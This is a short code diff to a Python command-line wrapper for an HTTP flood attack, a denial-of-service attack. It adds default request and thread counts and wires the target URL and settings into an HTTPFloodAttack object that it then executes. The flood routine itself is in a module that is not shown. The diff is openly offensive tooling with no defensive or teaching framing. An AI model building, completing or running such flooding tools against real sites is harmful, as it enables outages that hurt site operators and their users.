@@ -17,8 +17,8 @@ class HttpFlood(AttackBase):
 
     def add_arguments(self, parser: argparse.ArgumentParser) -> None:
         parser.add_argument('--url', required=True, help='Target URL')
-        parser.add_argument('--count', type=int, , help='Number of requests (default: 100)')
-        parser.add_argument('--threads', type=int, , help='Number of threads (default: 10)')
+        parser.add_argument('--count', type=int, default=100, help='Number of requests (default: 100)')
+        parser.add_argument('--threads', type=int, default=10, help='Number of threads (default: 10)')
         parser.add_argument('--verbose', action='store_true', help='Verbose output')
 
     def validate(self, args: argparse.Namespace) -> bool:
@@ -32,7 +32,15 @@ class HttpFlood(AttackBase):
         try:
             import http_flood as attack_module
             logger.info(f"Running http-flood attack")
-            # Attack execution handled by module
+
+            # Create and execute attack
+            attack = attack_module.HTTPFloodAttack(
+                args.url,
+                args.count,
+                args.threads,
+                args.verbose
+            )
+            attack.execute()
         except Exception as e:
             logger.error(f"Attack failed: {e}")
             raise
